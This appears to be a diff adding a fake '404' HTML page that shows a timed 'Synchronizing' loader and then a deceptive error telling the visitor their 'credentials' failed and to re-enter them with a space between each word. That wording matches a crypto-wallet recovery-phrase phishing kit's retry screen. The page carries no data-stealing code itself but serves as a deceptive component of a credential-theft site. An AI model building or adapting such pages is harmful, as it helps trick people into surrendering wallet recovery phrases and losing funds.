@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404 Error - Page Not Found</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>body {
+        margin: 0;
+        padding: 0;
+        font-family: 'Arial', sans-serif;
+        background-color: black;
+    }
+    
+    .loader-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+    
+    .loader {
+        display: flex;
+        align-items: center;
+    }
+    
+    .loading-text {
+        font-size: 20px;
+        margin-left: 10px;
+        animation: blink-caret 0.75s infinite;
+    }
+    
+    @keyframes blink-caret {
+        from, to { border-right: 3px solid #333; }
+        50% { border-right: 3px solid transparent; }
+    }
+    
+    .content-container {
+        display: none;
+        text-align: center;
+    }
+    
+    h1 {
+        font-size: 120px;
+        color: #e74c3c;
+        margin-bottom: 20px;
+    }
+    
+    p {
+        font-size: 20px;
+        color: #555;
+        margin: 10px 0;
+    }
+    
+    .error-message {
+        font-weight: bold;
+        color: #e74c3c;
+    }
+    
+    a {
+        display: inline-block;
+        padding: 10px 20px;
+        margin-top: 20px;
+        background-color: #3498db;
+        color: #fff;
+        text-decoration: none;
+        border-radius: 5px;
+        transition: background-color 0.3s ease;
+    }
+    
+    a:hover {
+        background-color: #2980b9;
+    }
+    
+    </style>
+</head><body>
+
+    <div class="loader-container">
+        <div class="loader">
+            <p class="loading-text">Synchronizing</p>
+        </div>
+    </div>
+
+    <div class="content-container" id="content">
+        <div class="error-content">
+            <h1>404</h1>
+            <p>Oops! Page not found.</p>
+            <p class="error-message">Failed to synchronize manually. Ensure you inputted the correct credentials and put a space between each word.</p>
+            <a href="index.html">Go back to homepage</a>
+        </div>
+    </div>
+
+  <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/mc-validate.js"></script><script type="text/javascript">(function($) {window.fnames = new Array(); window.ftypes = new Array();fnames[0]='EMAIL';ftypes[0]='email';fnames[1]='FNAME';ftypes[1]='text';fnames[2]='LNAME';ftypes[2]='text';fnames[3]='ADDRESS';ftypes[3]='address';fnames[4]='PHONE';ftypes[4]='phone';fnames[5]='BIRTHDAY';ftypes[5]='birthday';}(jQuery));var $mcj = jQuery.noConflict(true);</script></div>
+  
+
+    <script>
+        // Simulate loading for 10 seconds
+        setTimeout(function() {
+            document.getElementById('content').style.display = 'block';
+            document.querySelector('.loader-container').style.display = 'none';
+        }, 10000);
+    </script>
+
+
+
+
+</body>
+</html>
